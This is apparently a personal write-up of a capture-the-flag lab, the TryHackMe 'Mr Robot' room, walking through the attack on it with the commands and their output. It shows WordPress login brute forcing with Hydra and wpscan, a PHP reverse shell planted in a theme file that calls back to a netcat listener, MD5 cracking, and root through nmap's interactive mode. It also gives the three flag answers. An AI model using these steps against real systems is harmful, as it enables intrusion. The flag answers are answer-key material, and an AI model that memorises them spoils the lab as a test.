Task1 - Connect to our Network
-----------------------------------------------------

This task is just about getting connected via the usual vpn way.

__Questions__

Connect to our network using OpenVPN. Here is a mini walkthrough of connecting:

Go to your [access](http://tryhackme.com/access) page and download your configuration file.
Answer: _None needed_

When you run this you see lots of text, at the end it will say Initialization Sequence Completed
Answer: _None needed_

You are now ready to use our machines on our network!
Answer: _None needed_

Now when you deploy material, you will see an internal IP address of your Virtual Machine.
Answer: _None needed_


Task2 - Hack the machine
-----------------------------------------------

Initial port scan:
```bash
-----------------------------------------------------------
Enter your target IP address or URL here: 10.10.220.80
------------------------------------------------------------
Scanning target 10.10.220.80
Time started: 2022-11-23 21:21:18.869991
------------------------------------------------------------
Port 80 is open
Port 443 is open
Port scan completed in 0:01:38.879757
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p80,443 -sV -sC -T4 -Pn -oA 10.10.220.80 10.10.220.80
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p80,443 -sV -sC -T4 -Pn -oA 10.10.220.80 10.10.220.80
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 21:25 JST
Nmap scan report for 10.10.220.80
Host is up (0.26s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.74 seconds
------------------------------------------------------------
Combined scan completed in 0:04:44.595670
Press enter to quit...

```

Looks like we got a couple of web servers open. I will use gobuster on them:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.220.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.220.80
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/23 21:32:52 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.220.80/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.220.80/blog/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.220.80/wp-login.php]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.220.80/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.220.80/video/]
/0                    (Status: 301) [Size: 0] [--> http://10.10.220.80/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.220.80/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.220.80/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.220.80/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.220.80/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.220.80/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.220.80/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2606]
/css                  (Status: 301) [Size: 232] [--> http://10.10.220.80/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.220.80/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.220.80/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.220.80/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.220.80/Image/]
```


Ok I see a wordpress install.

Visiting the website has  super-cool looking demo someone did for Mr. Robot. Just wow... I got bogged down for 30 mins digging through that but it was very fun.

Checking out Robots.txt I found this:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Pulled the .dic file:
```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ curl -O http://10.10.220.80/fsocity.dic                                                                                   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0   463k      0  0:00:15  0:00:15 --:--:--  503k
                                                                                                                                                
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ file fsocity.dic 
fsocity.dic: , name offset 0x620a7574

```

Looks like a wordlist. I assume that's what we will need to bust this wordpress install?

Also there is our 1st key. Lets get it:

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ curl -O http://10.10.220.80/key-1-of-3.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0     63      0 --:--:-- --:--:-- --:--:--    63
                                                                                                                                                
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ cat key-1-of-3.txt                        
073403c8a58a1f80d943455fb30724b9

```

I am going to scan the wp site to see if there is some vulnerabilities or maybe it can give us the usernames. 

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ wpscan --url http://10.10.220.80/wp-login -e u                                           
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.220.80/wp-login/ [10.10.220.80]
[+] Started: Wed Nov 23 21:58:44 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.10.220.80/wp-login/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://10.10.220.80/wp-login/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://10.10.220.80/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://10.10.220.80/wp-includes/css/dashicons.min.css?ver=4.3.1
 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
 |  - http://10.10.220.80/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://10.10.220.80/wp-includes/css/dashicons.min.css?ver=4.3.1

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <==================================================================> (10 / 10) 100.00% Time: 00:00:03

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Nov 23 21:59:02 2022
[+] Requests Done: 80
[+] Cached Requests: 8
[+] Data Sent: 20.19 KB
[+] Data Received: 19.278 MB
[+] Memory used: 165.516 MB
[+] Elapsed time: 00:00:17

```

Bummer, no usernames found. Hmm..  guess it is nothing like a standard admin user of course. So I guess I have to use that dic file. I will try scanning it with Hydra.

While loading up BurpSuite to get the Login info for Hydra I saw this:

![[mr.robot2.png]]

This is pretty bad. The errors actually let us enumerate for the user. Maybe that is what we are supposed to do here? Maybe it is something simple. hmmm let me load this burp anyway and get the info just in case so I can run Hydra.

![[mr.robot3.png]]


```bash
log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.220.80%2Fwp-admin%2F&testcookie=1
```

So this line is really want I need. It is possible to send this to Intruder in Burpsuite, but TBH Burpsuite isn't well suited for this brute force when using a large wordlist, especially the community edition I am using.

```bash
hydra -V -L fsocity.dic -p random 10.10.220.80 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
```

Looks like we found the username:

![[mr.robot4.png]]

When reversing this command to find a password:

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ hydra -V -l elliot -P fsocity.dic 10.10.220.80 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-23 22:26:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task
[DATA] attacking http-post-form://10.10.220.80:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "true" - 1 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "false" - 2 of 858235 [child 1] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "wikia" - 3 of 858235 [child 2] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "from" - 4 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "the" - 5 of 858235 [child 4] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "now" - 6 of 858235 [child 5] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "Wikia" - 7 of 858235 [child 6] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "extensions" - 8 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "scss" - 9 of 858235 [child 8] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "window" - 10 of 858235 [child 9] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "http" - 11 of 858235 [child 10] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "var" - 12 of 858235 [child 11] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "page" - 13 of 858235 [child 12] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "Robot" - 14 of 858235 [child 13] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "Elliot" - 15 of 858235 [child 14] (0/0)
[ATTEMPT] target 10.10.220.80 - login "elliot" - pass "styles" - 16 of 858235 [child 15] (0/0)
[80][http-post-form] host: 10.10.220.80   login: elliot   password: window
[80][http-post-form] host: 10.10.220.80   login: elliot   password: http
[80][http-post-form] host: 10.10.220.80   login: elliot   password: Robot
[80][http-post-form] host: 10.10.220.80   login: elliot   password: Elliot
[80][http-post-form] host: 10.10.220.80   login: elliot   password: var
[80][http-post-form] host: 10.10.220.80   login: elliot   password: false
[80][http-post-form] host: 10.10.220.80   login: elliot   password: page
[80][http-post-form] host: 10.10.220.80   login: elliot   password: styles
[80][http-post-form] host: 10.10.220.80   login: elliot   password: wikia
[80][http-post-form] host: 10.10.220.80   login: elliot   password: from
[80][http-post-form] host: 10.10.220.80   login: elliot   password: now
[80][http-post-form] host: 10.10.220.80   login: elliot   password: true
[80][http-post-form] host: 10.10.220.80   login: elliot   password: the
[80][http-post-form] host: 10.10.220.80   login: elliot   password: Wikia
[80][http-post-form] host: 10.10.220.80   login: elliot   password: scss
[80][http-post-form] host: 10.10.220.80   login: elliot   password: extensions
1 of 1 target successfully completed, 16 valid passwords found
```

I think I have some problems here. Trying it again with wpscan now that we have the proper username:

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ wpscan --url http://10.10.220.80 --usernames users.txt --passwords list.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.220.80/ [10.10.220.80]
[+] Started: Wed Nov 23 22:34:39 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.220.80/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.220.80/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.220.80/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.220.80/082855a.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.220.80/082855a.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.220.80/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.220.80/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.220.80/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.220.80/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <=================================================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                  
All Found                                                                                                                                       
Progress Time: 00:00:40 <==============================================                                        > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Nov 23 22:35:31 2022
[+] Requests Done: 152
[+] Cached Requests: 41
[+] Data Sent: 38.804 KB
[+] Data Received: 1.282 MB
[+] Memory used: 291.945 MB
[+] Elapsed time: 00:00:52
```

sweet.. got a hit `ER28-0652`

I could login the site with that!

Now I will use the pentestmonkey's php-reverse-shell.

First I will start a listener so I don't forget:
```bash
──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 53
listening on [any] 53 ...
```

![[mr.robot5.png]]

I took the comments out of the top of the php-reverse-shell script to make it easier to copy/paste. Then after pasting it into the 404.php, I changed the IP/PORT lines.

Now with the listener in place I just submit this and navigate to:
`http://10.10.220.80/wp-content/twentyfifteen/404.php`

Now we have our reverse-shell.

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 53
listening on [any] 53 ...
connect to [10.18.3.219] from (UNKNOWN) [10.10.220.80] 40733
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 13:50:21 up  1:34,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ 

```

Now I did you rlwrap to help with initial shell stablity, but I want to use python if it is there to fix it better, but I realize I am just this daemon user and probably want to enumerate a little to see if I can find another user to jump to. I see only 1 user called robot but some interesting files:

```bash
$ which python
/usr/bin/python
$ ls /home
robot
$ cd /home/robot
$ ls
key-2-of-3.txt
password.raw-md5
$ ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

```

So I can't get the 2nd flag yet, but I see a password, maybe a backup and the type is write no the filename. Bad sysadmin, no cookie.

So let's try to crack it.

```bash
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/mr.robot]
└─$ john robot.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
1g 0:00:00:00 DONE (2022-11-23 23:02) 33.33g/s 1350Kp/s 1350Kc/s 1350KC/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

So we got the password! All the lowercase letters of the alphabet.

Now let's login as `robot:abcdefghijklmnopqrstuvwxyz`

```bash
$ su robot
su: must be run from a terminal
```

Mmmyeee.. that is why I wanted to stablize earlier ;)
```bash
$ which python
/usr/bin/python
$ /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 

```

Ok let's see if we can enumerate for any SUID binaries that we can exploit before maybe using LinPeas or something.

```bash
robot@linux:/$ find / -perm +6000 2>/dev/null | grep '/bin/'
find / -perm +6000 2>/dev/null | grep '/bin/'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
```

Oh nmap.. well there is an easy one.

So from https://gtfobins.github.io/gtfobins/nmap/#sudo we can just use the interactive keyword:

```
sudo nmap --interactive
nmap> !sh
```

And here we go:
```bash
robot@linux:/$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# cd /
cd /
# ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 

```

And there we are in just under the wire, we have the 3rd key.

__Questions__

What is key 1?
Answer: _073403c8a58a1f80d943455fb30724b9_


What is key 2?
Answer: _822c73956184f694993bede3eb39f959_


What is key 3?
Answer: _04787ddef27c3dee1ee161b21670b4e4_